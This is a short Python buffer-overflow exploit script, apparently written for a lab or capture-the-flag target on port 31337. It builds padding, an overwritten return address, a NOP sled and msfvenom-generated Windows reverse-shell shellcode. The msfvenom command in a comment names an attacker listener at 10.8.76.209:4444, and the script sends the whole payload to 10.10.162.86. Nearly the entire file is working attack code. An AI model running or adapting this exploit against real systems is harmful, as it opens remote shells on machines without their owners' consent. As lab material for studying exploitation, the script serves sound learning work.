#!/usr/bin/python
import socket,sys
from time import sleep
ip="10.10.162.86"
port="31337"
bof = "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 10
#msfvenom -p windows/shell_reverse_tcp LHOST=10.8.76.209 LPORT=4444 -f python -a x86 --platform windows -b "\x00\x0A"                                                                                                                                                                    
bof += b"\xdd\xc0\xba\x2f\x41\x1f\x27\xd9\x74\x24\xf4\x5e\x29"
bof += b"\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\xc1\xbd\xfd"
bof += b"\xd2\xe1\xd6\x80\x1d\x19\x27\xe5\x94\xfc\x16\x25\xc2"
bof += b"\x75\x08\x95\x80\xdb\xa5\x5e\xc4\xcf\x3e\x12\xc1\xe0"
bof += b"\xf7\x99\x37\xcf\x08\xb1\x04\x4e\x8b\xc8\x58\xb0\xb2"
bof += b"\x02\xad\xb1\xf3\x7f\x5c\xe3\xac\xf4\xf3\x13\xd8\x41"
bof += b"\xc8\x98\x92\x44\x48\x7d\x62\x66\x79\xd0\xf8\x31\x59"
bof += b"\xd3\x2d\x4a\xd0\xcb\x32\x77\xaa\x60\x80\x03\x2d\xa0"
bof += b"\xd8\xec\x82\x8d\xd4\x1e\xda\xca\xd3\xc0\xa9\x22\x20"
bof += b"\x7c\xaa\xf1\x5a\x5a\x3f\xe1\xfd\x29\xe7\xcd\xfc\xfe"
bof += b"\x7e\x86\xf3\x4b\xf4\xc0\x17\x4d\xd9\x7b\x23\xc6\xdc"
bof += b"\xab\xa5\x9c\xfa\x6f\xed\x47\x62\x36\x4b\x29\x9b\x28"
bof += b"\x34\x96\x39\x23\xd9\xc3\x33\x6e\xb6\x20\x7e\x90\x46"
bof += b"\x2f\x09\xe3\x74\xf0\xa1\x6b\x35\x79\x6c\x6c\x3a\x50"
bof += b"\xc8\xe2\xc5\x5b\x29\x2b\x02\x0f\x79\x43\xa3\x30\x12"
bof += b"\x93\x4c\xe5\xb5\xc3\xe2\x56\x76\xb3\x42\x07\x1e\xd9"
bof += b"\x4c\x78\x3e\xe2\x86\x11\xd5\x19\x41\x14\x22\x6d\x40"
bof += b"\x40\x30\x6d\x73\xcd\xbd\x8b\x19\xfd\xeb\x04\xb6\x64"
bof += b"\xb6\xde\x27\x68\x6c\x9b\x68\xe2\x83\x5c\x26\x03\xe9"
bof += b"\x4e\xdf\xe3\xa4\x2c\x76\xfb\x12\x58\x14\x6e\xf9\x98"
bof += b"\x53\x93\x56\xcf\x34\x65\xaf\x85\xa8\xdc\x19\xbb\x30"
bof += b"\xb8\x62\x7f\xef\x79\x6c\x7e\x62\xc5\x4a\x90\xba\xc6"
bof += b"\xd6\xc4\x12\x91\x80\xb2\xd4\x4b\x63\x6c\x8f\x20\x2d"
bof += b"\xf8\x56\x0b\xee\x7e\x57\x46\x98\x9e\xe6\x3f\xdd\xa1"
bof += b"\xc7\xd7\xe9\xda\x35\x48\x15\x31\xfe\x78\x5c\x1b\x57"
bof += b"\x11\x39\xce\xe5\x7c\xba\x25\x29\x79\x39\xcf\xd2\x7e"
bof += b"\x21\xba\xd7\x3b\xe5\x57\xaa\x54\x80\x57\x19\x54\x81"

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.162.86',31337))
    s.send(bof + '\r\n')
    s.recv(1024)
    s.close()
except:
    sys.exit(0)

